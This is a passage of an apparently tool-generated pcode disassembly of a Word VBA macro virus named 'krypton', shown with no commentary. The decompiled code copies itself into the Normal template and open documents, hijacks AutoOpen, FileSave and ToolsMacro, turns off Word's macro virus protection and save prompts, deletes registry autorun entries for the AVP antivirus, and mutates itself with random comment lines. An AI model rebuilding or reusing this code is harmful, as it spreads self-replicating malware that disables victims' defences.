' 	ArgsMemLdWith Lines 0x0002 
' 	St CI 
' Line #51:
' 	EndWith 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld Document 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set HI 
' Line #55:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #56:
' 	LitDI2 0x007B 
' 	LitStr 0x0011 "Private Sub aaa()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	LitDI2 0x008A 
' 	LitStr 0x0011 "Private Sub bbb()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #58:
' 	LitDI2 0x0098 
' 	LitStr 0x0011 "Private Sub ccc()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	LitDI2 0x00A0 
' 	LitStr 0x0011 "Private Sub ddd()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #60:
' 	LitDI2 0x00A8 
' 	LitStr 0x0011 "Private Sub eee()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #61:
' 	LitDI2 0x00AA 
' 	LitStr 0x0011 "Private Sub fff()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #62:
' 	LitDI2 0x00AC 
' 	LitStr 0x0011 "Private Sub ggg()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #63:
' 	LitDI2 0x00B0 
' 	LitStr 0x0011 "Private Sub hhh()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #64:
' 	LitDI2 0x00B6 
' 	LitStr 0x0011 "Private Sub iii()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #65:
' 	LitDI2 0x00C1 
' 	LitStr 0x0011 "Private Sub kkk()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #66:
' 	LitDI2 0x00CC 
' 	LitStr 0x0011 "Private Sub lll()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St CI 
' Line #68:
' 	EndWith 
' Line #69:
' 	StartWithExpr 
' 	Ld HI 
' 	With 
' Line #70:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld CI 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #72:
' 	EndWith 
' Line #73:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #74:
' 	LitDI2 0x007B 
' 	LitStr 0x000E "Sub AutoExec()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #75:
' 	LitDI2 0x008A 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #76:
' 	LitDI2 0x0098 
' 	LitStr 0x000E "Sub FileSave()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #77:
' 	LitDI2 0x00A0 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #78:
' 	LitDI2 0x00A8 
' 	LitStr 0x0010 "Sub ViewVBcode()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #79:
' 	LitDI2 0x00AA 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #80:
' 	LitDI2 0x00AC 
' 	LitStr 0x000E "Sub AutoExit()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #81:
' 	LitDI2 0x00B0 
' 	LitStr 0x0012 "Sub ToolsOptions()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #82:
' 	LitDI2 0x00B6 
' 	LitStr 0x000E "Sub Mutation()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #83:
' 	LitDI2 0x00C1 
' 	LitStr 0x0009 "Sub xxx()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #84:
' 	LitDI2 0x00CC 
' 	LitStr 0x000D "Sub Antigen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #85:
' 	EndWith 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Private Sub Document_Close())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #93:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	Else 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #94:
' 	LineNum 1 
' 	BoS 0x0003 
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #95:
' 	LineNum 2 
' 	BoS 0x0003 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Private Sub Document_New())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #98:
' 	Dim 
' 	VarDefn H
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St H 
' Line #99:
' 	Ld H 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #100:
' 	Ld H 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #101:
' 	LineNum 1 
' 	BoS 0x0003 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #102:
' 	LitDI2 0x00C1 
' 	LitStr 0x000E "Sub FileOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' Line #103:
' 	Dim 
' 	VarDefn V
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St V 
' 	BoS 0x0000 
' 	Ld V 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #104:
' 	LitStr 0x000B "krypton.bas"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "krypton"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #107:
' 	LitStr 0x000B "krypton.bas"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #108:
' 	LitStr 0x000B "krypton.bas"
' 	ArgsCall Kill 0x0001 
' Line #109:
' 	SetStmt 
' 	LitStr 0x0007 "krypton"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ND 
' Line #110:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #111:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VC 
' Line #112:
' 	EndWith 
' Line #113:
' 	StartWithExpr 
' 	Ld ND 
' 	With 
' Line #114:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #115:
' 	LitDI2 0x0001 
' 	Ld VC 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #116:
' 	EndWith 
' Line #117:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set SS 
' Line #118:
' 	StartWithExpr 
' 	Ld SS 
' 	With 
' Line #119:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #120:
' 	EndWith 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Private Sub aaa())
' Line #123:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #124:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #125:
' 	OnError 1 
' Line #126:
' 	StartWithExpr 
' 	LitStr 0x0007 "krypton"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #127:
' 	LitDI2 0x00C1 
' 	LitStr 0x0009 "Sub xxx()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn R
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St R 
' 	BoS 0x0000 
' 	Ld R 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #128:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ND 
' Line #129:
' 	StartWithExpr 
' 	LitStr 0x0007 "krypton"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #130:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VC 
' 	BoS 0x0000 
' 	EndWith 
' Line #131:
' 	StartWithExpr 
' 	Ld ND 
' 	With 
' Line #132:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #133:
' 	LitDI2 0x0001 
' 	Ld VC 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #134:
' 	EndWith 
' Line #135:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0007 "krypton"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #136:
' 	LineNum 1 
' 	BoS 0x0003 
' 	EndSub 
' Line #137:
' 	FuncDefn (Private Sub bbb())
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #140:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #141:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #142:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #143:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #144:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #145:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #146:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #147:
' 	Dim 
' 	VarDefn S
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St S 
' 	BoS 0x0000 
' 	Ld S 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #148:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #149:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Private Sub ccc())
' Line #152:
' 	OnError (Resume Next) 
' Line #153:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #154:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #155:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #156:
' 	Dim 
' 	VarDefn P
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St P 
' 	BoS 0x0000 
' 	Ld P 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #157:
' 	LineNum 1 
' 	BoS 0x0003 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Private Sub ddd())
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #162:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #163:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #164:
' 	Dim 
' 	VarDefn T
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St T 
' 	BoS 0x0000 
' 	Ld T 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #165:
' 	LineNum 1 
' 	BoS 0x0003 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Private Sub eee())
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Private Sub fff())
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Private Sub ggg())
' Line #172:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #173:
' 	Dim 
' 	VarDefn W
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St W 
' 	BoS 0x0000 
' 	Ld W 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #174:
' 	EndSub 
' Line #175:
' 	FuncDefn (Private Sub hhh())
' Line #176:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #177:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Private Sub iii())
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0005 "AVPCC"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #184:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0048 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices"
' 	LitStr 0x000D "AVPCC Service"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #185:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St jXjX 
' Line #186:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld jXjX 
' 	For 
' Line #187:
' 	LitStr 0x0007 "krypton"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ZjZj 
' Line #188:
' 	Ld Rnd 
' 	LitDI2 0x01C7 
' 	Mul 
' 	St a 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0050 
' 	Mul 
' 	St B 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00A0 
' 	Mul 
' 	St C 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00B4 
' 	Mul 
' 	St D 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0031 
' 	Mul 
' 	St e 
' Line #189:
' 	Ld ZjZj 
' 	LitStr 0x0001 "'"
' 	Ld a 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld B 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld C 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld D 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0007 "krypton"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #190:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Private Sub kkk())
' Line #193:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #194:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #195:
' 	Ld WordBasic 
' 	ArgsMemCall EnableAutoMacros 0x0000 
' Line #196:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #197:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #198:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #199:
' 	Dim 
' 	VarDefn C
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St C 
' 	BoS 0x0000 
' 	Ld C 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #200:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #201:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Private Sub lll())
' Line #204:
' 	OnError (Resume Next) 
' Line #205:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #206:
' 	LineNum 1 
' 	BoS 0x0003 
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "krypton"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #207:
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "krypton"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St e 
' Line #208:
' 	Ld e 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "krypton"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #209:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	GoTo 3 
' Line #211:
' 	LineNum 2 
' 	BoS 0x0003 
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #212:
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St e 
' Line #213:
' 	Ld e 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #214:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	NextVar 
' Line #215:
' 	LineNum 3 
' 	BoS 0x0000 
' Line #216:
' 	EndSub 
' Line #217:
' 	Rem 0x0000 ""
' Line #218:
' 	Rem 0x003D "                  MMM            MMMMMMMMM                 MM"
' Line #219:
' 	Rem 0x003D "                MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM"
' Line #220:
' 	Rem 0x003E "                 MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM"
' Line #221:
' 	Rem 0x003E "                  MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM"
' Line #222:
' 	Rem 0x003F "                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
' Line #223:
' 	Rem 0x003F "                  MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
' Line #224:
' 	Rem 0x003F "                  MMM        MMMMMMMMMMMMM           MMMMMMMMMM"
' Line #225:
' 	Rem 0x003F "                  MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM"
' Line #226:
' 	Rem 0x003F "                   MM         MMMMMMMM               M  MMMMMMM"
' Line #227:
' 	Rem 0x003F "                   MM        MMMMMMMMM             MMM   MMMMMM"
' Line #228:
' 	Rem 0x003F "                            MMMMMMMMMMMMMM      MMMMM    MMMMMM"
' Line #229:
' 	Rem 0x003E "                   MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM"
' Line #230:
' 	Rem 0x003E "                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM"
' Line #231:
' 	Rem 0x003D "                 MMMMMMMMMM                                MM"
' Line #232:
' 	Rem 0x0000 ""
' Line #233:
' 	Rem 0x0031 "                               CLASS<----->MODULE"
